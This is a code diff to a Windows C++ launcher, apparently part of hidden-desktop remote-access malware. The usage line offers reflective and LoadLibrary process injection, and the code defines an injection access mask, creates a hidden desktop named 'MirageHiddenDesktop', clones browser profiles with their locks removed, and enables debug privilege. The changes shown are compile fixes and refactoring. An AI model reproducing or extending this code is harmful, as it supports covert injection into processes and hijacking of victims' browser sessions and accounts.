@@ -16,8 +16,7 @@
  *   BackstageLauncher.exe --method reflective|loadlibrary
  */
 
-#define WIN32_LEAN_AND_MEAN
-#define NOMINMAX
+// WIN32_LEAN_AND_MEAN and NOMINMAX are passed on the compiler command line.
 #include <windows.h>
 #include <tlhelp32.h>
 #include <psapi.h>
@@ -62,16 +61,15 @@ static void Log(const char* fmt, ...) {
 // Constants (mirrored from Go)
 // ---------------------------------------------------------------------------
 
+// Composite access mask used when opening a target process for injection.
+// Individual flags (PROCESS_CREATE_THREAD etc.) come from the SDK.
 static constexpr DWORD PROCESS_ALL_ACCESS_INJ =
     PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
     PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
 
-static constexpr DWORD SE_PRIVILEGE_ENABLED_FLAG = 0x00000002;
-static constexpr DWORD TOKEN_ADJUST_PRIVS        = 0x0020;
-static constexpr DWORD TOKEN_QUERY_FLAG          = 0x0008;
-
-static constexpr DWORD IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b;
-static constexpr DWORD IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b;
+// SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY,
+// IMAGE_NT_OPTIONAL_HDR32_MAGIC, IMAGE_NT_OPTIONAL_HDR64_MAGIC
+// are all provided by <windows.h> / <winnt.h>; no re-definition needed.
 
 static const char* BACKSTAGE_DESKTOP_NAME = "MirageHiddenDesktop";
 
@@ -267,8 +265,9 @@ static void CollectProfileDir(
                 if (!e2.is_regular_file()) continue;
                 std::string n2 = e2.path().filename().string();
                 if (IsCloneLockFileName(n2)) continue;
-                fs::path rel = fs::relative(e2.path(), src, ec2);
-                if (ec2) continue;
+                std::error_code relEc;
+                fs::path rel = fs::relative(e2.path(), src, relEc);
+                if (relEc) continue;
                 jobs.push_back({ e2.path(), d.parent_path() / rel,
                                  (int64_t)e2.file_size() });
             }
@@ -289,8 +288,9 @@ static void CollectDirFiles(
         if (!e.is_regular_file()) continue;
         std::string name = e.path().filename().string();
         if (IsCloneLockFileName(name)) continue;
-        fs::path rel = fs::relative(e.path(), src, ec);
-        if (ec) continue;
+        std::error_code relEc;
+        fs::path rel = fs::relative(e.path(), src, relEc);
+        if (relEc) continue;
         jobs.push_back({ e.path(), dst / rel, (int64_t)e.file_size() });
     }
 }
@@ -430,7 +430,7 @@ static void RemoveProfileLocks(const std::string& cloneDir, bool isFirefox) {
 static void EnableDebugPrivilege() {
     HANDLE hToken = nullptr;
     if (!OpenProcessToken(GetCurrentProcess(),
-                          TOKEN_ADJUST_PRIVS | TOKEN_QUERY_FLAG,
+                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                           &hToken))
         return;
 
